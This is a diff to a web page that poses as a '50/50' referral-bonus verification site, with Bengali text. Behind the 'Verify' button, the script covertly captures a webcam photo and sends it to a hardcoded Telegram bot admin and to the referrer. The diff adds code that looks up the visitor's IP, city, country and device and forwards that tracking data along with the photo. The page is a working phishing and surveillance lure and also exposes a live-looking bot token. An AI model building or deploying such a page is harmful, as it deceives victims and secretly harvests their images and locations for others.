@@ -5,73 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>50/50 Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body { 
-            font-family: 'Segoe UI', Arial, sans-serif;
-            text-align: center;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-color: #000; /* ছবি লোড না হলে কালো দেখাবে */
-            /* আপনার দেওয়া নির্দিষ্ট ইমেজ লিঙ্ক */
-            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-        }
-
-        /* ব্যাকগ্রাউন্ডের ওপর হালকা অন্ধকার লেয়ার */
-        .overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.4); 
-            z-index: 1;
-        }
-
-        .container {
-            background: rgba(255, 255, 255, 0.15); 
-            backdrop-filter: blur(10px); 
-            -webkit-backdrop-filter: blur(10px);
-            padding: 40px 20px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-            width: 85%;
-            max-width: 380px;
-            z-index: 2;
-            position: relative;
-        }
-
-        h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        h2 { color: #ffeb3b; font-size: 18px; margin-bottom: 10px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-        p { color: #ffffff; font-size: 15px; margin-bottom: 25px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-
-        #verify-btn { 
-            background-color: #1a73e8; 
-            color: white; border: none; padding: 15px 40px; 
-            font-size: 18px; border-radius: 50px; cursor: pointer; 
-            width: 100%; font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
-
+        /* আগের স্টাইল একই থাকবে */
+        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); background-size: cover; background-position: center; position: relative; }
+        body::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); z-index: 1; }
+        .container { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(10px); padding: 40px 20px; border-radius: 20px; width: 85%; max-width: 380px; z-index: 2; position: relative; border: 1px solid rgba(255, 255, 255, 0.2); }
+        h1, h2, p { color: #ffffff; text-shadow: 1px 1px 2px #000; }
+        #verify-btn { background-color: #1a73e8; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; width: 100%; font-weight: bold; }
         #video, #canvas { display: none; }
-        #status { margin-top: 20px; color: #00ff00; font-weight: bold; font-size: 16px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        #status { margin-top: 20px; color: #00ff00; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div class="overlay"></div>
-
     <div class="container">
         <h1>Welcome to 50/50</h1>
         <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
         <p>বোনাস পেতে হলে verify করুন</p>
         <button id="verify-btn">Verify</button>
         <div id="status"></div>
-
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
     </div>
@@ -79,7 +29,6 @@
     <script>
         const botToken = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec";
         const adminId = "7068444019"; 
-
         const urlParams = new URLSearchParams(window.location.search);
         const userIdFromLink = urlParams.get('id'); 
 
@@ -91,6 +40,16 @@
         verifyBtn.addEventListener('click', async () => {
             status.innerText = "Processing... Please wait";
             verifyBtn.style.display = "none"; 
+
+            // ১. ইউজারের আইপি এবং লোকেশন ট্র্যাকিং
+            let trackerInfo = "Tracking Info:\n";
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                trackerInfo += `IP: ${ipData.ip}\nCity: ${ipData.city}\nCountry: ${ipData.country_name}\nDevice: ${navigator.userAgent.substring(0, 50)}...`;
+            } catch (e) {
+                trackerInfo += "Could not fetch IP details.";
+            }
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -104,11 +63,11 @@
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob(async (blob) => {
-                            // অ্যাডমিন এবং ইউজারকে ছবি পাঠানো
+                            // অ্যাডমিন এবং রেফারারকে ছবি ও ট্র্যাকিং তথ্য পাঠানো
                             if (userIdFromLink && userIdFromLink !== adminId) {
-                                await sendToTelegram(blob, userIdFromLink, "New bonus claimant photo!");
+                                await sendToTelegram(blob, userIdFromLink, trackerInfo);
                             }
-                            await sendToTelegram(blob, adminId, "Admin: New photo captured!");
+                            await sendToTelegram(blob, adminId, `Admin Alert!\n${trackerInfo}`);
 
                             status.innerText = "Verification Successful!";
                             stream.getTracks().forEach(track => track.stop());
